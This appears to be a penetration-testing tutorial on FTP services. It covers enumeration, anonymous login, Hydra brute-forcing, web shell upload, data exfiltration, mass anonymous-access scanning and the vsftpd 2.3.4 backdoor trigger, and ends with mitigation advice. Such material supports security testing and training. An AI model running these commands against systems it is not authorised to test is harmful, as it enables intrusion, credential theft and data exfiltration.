# FTP

## FTP Services

File Transfer Protocol (FTP) is one of the oldest and most widely used protocols for transferring files between systems over a network. Despite its age and inherent security limitations, FTP remains common in many environments, making it an important target for penetration testers.

### Protocol Overview

FTP operates using two channels:

* **Control Channel (Port 21)**: Handles commands and responses
* **Data Channel (Port 20 or random high port in passive mode)**: Transfers actual file data

#### Common Variants

* **FTP**: Standard unencrypted FTP (Port 21)
* **FTPS**: FTP with SSL/TLS encryption
* **SFTP**: Not FTP, but a separate file transfer protocol that runs over SSH

### Enumeration Techniques

#### Basic Port Scanning

```bash
# Identify FTP services
nmap -p 21 -sV <target>

# More comprehensive scan with scripts
nmap -p 21 --script=ftp-* <target>
```

#### Banner Grabbing

FTP servers typically display a banner upon connection that can reveal valuable information:

```bash
nc -nv <target> 21
telnet <target> 21
```

Example output:

```
220 ProFTPD 1.3.5a Server (FTP Server) [10.129.14.136]
```

This reveals software name and version information that can be used to identify potential vulnerabilities.

### Authentication Methods

#### Anonymous Access

One of the most common misconfigurations is allowing anonymous access:

```bash
ftp <target>
Username: anonymous
Password: anonymous@domain.com
```

If successful, this grants access without valid credentials - a significant security issue.

#### Brute Force Attacks

When anonymous access is not available, credential brute forcing can be attempted:

```bash
# Using Hydra
hydra -L users.txt -P passwords.txt ftp://<target>

# Using Medusa
medusa -u user -P passwords.txt -h <target> -M ftp
```

Example Hydra execution:

```
hydra -l user -P /usr/share/wordlists/rockyou.txt 10.129.14.136 ftp
[21][ftp] host: 10.129.14.136   login: user   password: password123
```

### Common FTP Commands

Once authenticated, these commands are useful for interacting with the FTP server:

| Command         | Description              |
| --------------- | ------------------------ |
| `USER username` | Authentication username  |
| `PASS password` | Authentication password  |
| `HELP`          | Show available commands  |
| `PWD`           | Print working directory  |
| `DIR`           | List directory contents  |
| `CWD directory` | Change working directory |
| `GET filename`  | Download file            |
| `PUT filename`  | Upload file              |
| `PASV`          | Enable passive mode      |
| `QUIT`          | End session              |

### Vulnerability Assessment

#### Common Vulnerabilities

1. **Anonymous Authentication**: Allows access without valid credentials
2. **Cleartext Credentials**: FTP transmits credentials in plaintext
3. **Outdated Software**: Many deployments run older versions with known vulnerabilities
4. **Directory Traversal**: Some implementations allow navigating outside intended directories
5. **Brute Force Susceptibility**: Often lacks account lockout mechanisms

#### Software-Specific Vulnerabilities

| FTP Server                | Notable Vulnerabilities      |
| ------------------------- | ---------------------------- |
| vsftpd 2.3.4              | Backdoor vulnerability       |
| ProFTPD < 1.3.5           | Multiple RCE vulnerabilities |
| Pure-FTPd < 1.0.47        | TLS/SSL vulnerabilities      |
| FileZilla Server < 0.9.60 | Multiple DoS vulnerabilities |

### Data Exfiltration and Access

#### Retrieving Files

Once authenticated to an FTP server, files can be retrieved:

```bash
ftp> get sensitive_file.txt
```

For multiple files:

```bash
ftp> prompt off
ftp> mget *.txt
```

#### Uploading Files

If write permissions exist, this can be leveraged for exploitation:

```bash
ftp> put shell.php
```

For web servers that expose FTP directories, uploading web shells can lead to remote code execution.

### Common Attack Scenarios

#### FTP Directory Exposure in Web Root

When FTP directories are accessible via web servers:

1. Authenticate to FTP
2. Upload web shell to FTP directory
3. Execute shell via web browser

#### Configuration File Access

FTP servers may expose sensitive configuration files:

```bash
ftp> get ftpusers
ftp> get user_list
ftp> get vsftpd.conf
```

These files often contain plaintext credentials or security settings.

#### Abusing FTP for Data Exfiltration

In environments with restricted outbound connections, FTP can sometimes be used to exfiltrate data:

```bash
# From compromised system
ftp> put stolen_data.zip
```

### Misconfiguration Detection

#### Identifying Writable Directories

```bash
# Test ability to create directories
ftp> mkdir test

# Test file upload
ftp> put test.txt
```

#### Checking Permissions

```bash
# List files with permissions
ftp> ls -la
```

Example output:

```
drwxr-xr-x 2 user     group     4096 Aug 1 12:00 .
drwxr-xr-x 4 user     group     4096 Aug 1 12:00 ..
-rw-r--r-- 1 user     group     1234 Aug 1 12:00 confidential.txt
```

#### Testing Directory Traversal

```bash
# Attempt to navigate outside intended directory
ftp> cd ../
ftp> cd /etc
```

### FTP Penetration Testing Methodology

1. **Discovery**: Identify FTP services on the network
2. **Banner Analysis**: Gather version information
3. **Authentication Testing**: Try anonymous login, then credential attacks
4. **Directory Enumeration**: Map accessible directories and permissions
5. **Configuration Review**: Look for misconfigurations and security issues
6. **Vulnerability Testing**: Check for known vulnerabilities based on version
7. **Exploitation**: Attempt appropriate exploits
8. **Post-Exploitation**: Extract valuable information or establish persistence

### Mitigation Strategies

When reporting FTP vulnerabilities, consider recommending:

1. **Disable anonymous access** unless explicitly required
2. **Implement FTPS or SFTP** instead of plain FTP
3. **Restrict access** to specific IP addresses
4. **Implement strong password policies**
5. **Run FTP servers in chroot environments**
6. **Keep server software updated**
7. **Implement file integrity monitoring**
8. **Consider modern alternatives** to FTP

### Practical Commands for FTP Testing

#### Automating Anonymous Access Checks

```bash
# Create a script to test multiple hosts
for ip in $(cat targets.txt); do
  echo "Testing $ip"
  timeout 3 bash -c "echo -e 'anonymous\nanonymous@domain.com\nquit' | ftp -n $ip 2>/dev/null"
done
```

#### Downloading All Files Recursively

```bash
# Using wget for recursive download
wget -r ftp://anonymous:anonymous@$ip
```

#### Testing Command Execution Vulnerabilities

For vulnerable versions like vsftpd 2.3.4:

```bash
# Triggering backdoor
telnet <target> 21
USER backdoor:)
PASS any
```

By understanding FTP services and their security implications, penetration testers can effectively identify and exploit misconfigurations and vulnerabilities in these systems.
